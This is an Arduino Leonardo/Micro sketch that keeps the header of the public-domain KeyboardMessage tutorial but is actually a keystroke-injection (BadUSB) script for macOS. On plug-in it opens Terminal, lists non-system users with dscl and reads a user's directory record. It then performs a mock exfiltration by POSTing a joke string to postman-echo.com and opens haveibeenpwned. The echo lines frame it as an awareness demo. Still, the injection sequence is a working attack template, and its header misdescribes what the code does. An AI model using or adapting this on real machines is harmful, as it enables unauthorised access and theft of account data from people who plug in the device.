/*
  Keyboard Message test

  For the Arduino Leonardo and Micro.

  Sends a text string when a button is pressed.

  The circuit:
  - pushbutton attached from pin 4 to +5V
  - 10 kilohm resistor attached from pin 4 to ground

  created 24 Oct 2011
  modified 27 Mar 2012
  by Tom Igoe
  modified 11 Nov 2013
  by Scott Fitzgerald

  This example code is in the public domain.

  http://www.arduino.cc/en/Tutorial/KeyboardMessage
*/

#include "Keyboard.h"

int ranOnce = 0;
void setup() {
     delay(2000);
}

void loop() {
  
  if (ranOnce==0) {
      ranOnce=1;
      Keyboard.press(KEY_LEFT_GUI);
      Keyboard.press(' ');
      Keyboard.releaseAll();
      delay(1000);
      Keyboard.print("terminal");
      delay(1200);
      Keyboard.write(KEY_RETURN);
      delay(2000);
      Keyboard.press(KEY_LEFT_GUI);
      Keyboard.press('n');
      Keyboard.releaseAll();
      delay(1800);
      Keyboard.press(KEY_LEFT_GUI);
      for(int i = 0; i < 12; i++) {
        Keyboard.write(43);
        delay(150);
      }
      delay(1000);
      Keyboard.releaseAll();
      Keyboard.print("echo 'Oh hai Mark!'");
      Keyboard.write(KEY_RETURN);
      delay(2300);
      Keyboard.print("echo 'I wonder who the non system users are on this system?'");
      Keyboard.write(KEY_RETURN);
      delay(2500);
      Keyboard.print("dscl -plist . list /Users | grep -v '\\(^_\\|root\\|daemon\\|nobody\\)'");
      delay(700);
      Keyboard.write(KEY_RETURN);
      delay(200);
      Keyboard.print("dscl -plist . list /Users | grep -v '\\(^_\\|root\\|daemon\\|nobody\\)' | head -1 | pbcopy -1");
      Keyboard.write(KEY_RETURN);
      delay(4500);
      Keyboard.print("echo 'Thats nice...can we get some more info?'");
      Keyboard.write(KEY_RETURN);
      delay(2000);
      Keyboard.print("dscl");
      delay(1000);
      Keyboard.write(KEY_RETURN);
      delay(1000);
      Keyboard.print("read ");
      delay(500);
      Keyboard.print("Local/");
      delay(200);
      Keyboard.print("Default/");
      delay(200);
      Keyboard.print("Users/");
      delay(200);
      Keyboard.press(KEY_LEFT_GUI);
      Keyboard.press('v');
      Keyboard.releaseAll();
      Keyboard.write(KEY_RETURN);
      delay(4500);
      Keyboard.print("exit");
      delay(750);
      Keyboard.write(KEY_RETURN);
      Keyboard.print("clear");
      Keyboard.write(KEY_RETURN);
      delay(500);
      Keyboard.print("echo 'yikes....'");
      Keyboard.write(KEY_RETURN);
      delay(2000);
      Keyboard.print("curl -v --silent --location --request POST \"https://postman-echo.com/post\" \\--data \"Thank goodness this isn't some malicious payload right???\" 2>&1 | grep json");
      Keyboard.write(KEY_RETURN);
      delay(5000);
      Keyboard.print("open http://haveibeenpwned.com");
      Keyboard.write(KEY_RETURN);
  }

}
